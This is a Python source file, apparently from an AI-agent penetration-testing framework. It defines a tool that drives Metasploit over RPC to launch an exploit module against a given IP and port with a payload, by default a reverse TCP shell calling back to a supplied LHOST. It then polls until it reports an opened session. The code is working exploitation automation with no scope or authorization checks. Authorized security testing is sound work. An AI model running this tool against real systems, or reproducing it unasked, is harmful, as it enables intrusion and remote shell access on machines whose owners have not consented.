from __future__ import annotations
import asyncio
import json
import logging
from typing import TYPE_CHECKING, ClassVar, Optional

from pydantic import Field
from pymetasploit3.msfrpc import MsfRpcClient

from sgr_pentest.core.base_tool import BaseTool
from sgr_pentest.core.agent_config import GlobalConfig

if TYPE_CHECKING:
    from sgr_pentest.core.models import ResearchContext

logger = logging.getLogger(__name__)


class ExploitationTool(BaseTool):
    """
    Выполняет попытку эксплуатации уязвимости с помощью Metasploit.
    Используется после того, как VulnerabilityScanTool (searchsploit) нашел
    конкретный путь к эксплойту в Exploit-DB.
    """
    tool_name: ClassVar[str] = "exploitationtool"

    reasoning: str = Field(
        description="Краткое объяснение, почему выбрана именно эта уязвимость и этот эксплойт."
    )
    target: str = Field(
        description="IP-адрес целевой машины (RHOSTS)."
    )
    port: int = Field(
        description="Порт целевого сервиса (RPORT)."
    )
    lhost: str = Field(
        description="IP-адрес для обратного подключения (LHOST). Этот адрес должен быть получен с помощью инструмента 'getlocalip'."
    )
    exploit_path: str = Field(
        description="Путь к модулю эксплойта в Metasploit, полученный от searchsploit (например, 'exploit/windows/smb/ms17_010_eternalblue')."
    )
    payload_path: Optional[str] = Field(
        default="generic/shell_reverse_tcp",
        description="Путь к payload'у, который будет использован (например, 'windows/meterpreter/reverse_tcp')."
    )

    async def __call__(self, context: ResearchContext) -> str:
        """
        Подключается к msfrpcd, настраивает и запускает эксплойт.
        """
        logger.info(f"Запуск ExploitationTool: {self.exploit_path} на {self.target}:{self.port}")

        config = GlobalConfig()
        msf_config = config.metasploit

        try:
            client = MsfRpcClient(
                msf_config.password,
                port=msf_config.port,
                server=msf_config.host,
                user=msf_config.user,
                ssl=msf_config.ssl
            )
            logger.info(f"Успешно подключено к Metasploit RPC на {msf_config.host}:{msf_config.port}.")
        except Exception as e:
            error_msg = f"Не удалось подключиться к Metasploit RPC: {e}. Убедитесь, что msfrpcd запущен и конфигурация верна."
            logger.error(error_msg)
            return json.dumps({"status": "error", "message": error_msg})

        try:
            sessions_before = set(client.sessions.list.keys())
            logger.info(f"Сессии до атаки: {sessions_before or 'нет'}")

            exploit = client.modules.use('exploit', self.exploit_path)
            exploit['RHOSTS'] = self.target
            exploit['RPORT'] = str(self.port)

            payload = client.modules.use('payload', self.payload_path)
            payload['LHOST'] = self.lhost

            job_info = exploit.execute(payload=payload)
            job_id = job_info.get('job_id')
            if not job_id:
                raise RuntimeError("Не удалось запустить эксплойт как фоновую задачу (job).")
            logger.info(f"Эксплойт запущен как задача (job_id: {job_id}). Начинаем опрос результата...")

            total_wait_time = 60
            poll_interval = 3

            for _ in range(total_wait_time // poll_interval):
                await asyncio.sleep(poll_interval)

                sessions_now = set(client.sessions.list.keys())
                new_sessions = sessions_now - sessions_before

                if new_sessions:
                    new_session_id = new_sessions.pop()
                    session_info = client.sessions.list[new_session_id]
                    logger.info(f"Получена новая сессия {new_session_id}: {session_info.get('info')}")

                    return json.dumps({
                        "status": "success",
                        "session_id": new_session_id,
                        "session_info": session_info,
                        "message": "Эксплуатация прошла успешно, получена сессия."
                    }, indent=2)

                job_status = client.jobs.info(job_id)
                if not job_status:
                    logger.warning(f"Задача {job_id} завершилась, но сессия не была создана. Атака неуспешна.")
                    return json.dumps({
                        "status": "failure",
                        "message": "Эксплойт выполнен, но не привел к созданию сессии.",
                        "job_id": job_id
                    }, indent=2)

                logger.info(f"Ожидание... (прошло {_ * poll_interval + poll_interval} сек). Новых сессий нет.")

            logger.error(f"Тайм-аут ожидания сессии после {total_wait_time} секунд.")
            client.jobs.stop(job_id)
            return json.dumps({
                "status": "failure",
                "message": f"Тайм-аут. Сессия не была получена в течение {total_wait_time} секунд.",
                "job_id": job_id
            }, indent=2)

        except Exception as e:
            error_msg = f"Ошибка при выполнении эксплойта: {e}"
            logger.error(error_msg, exc_info=True)
            return json.dumps({"status": "error", "message": error_msg})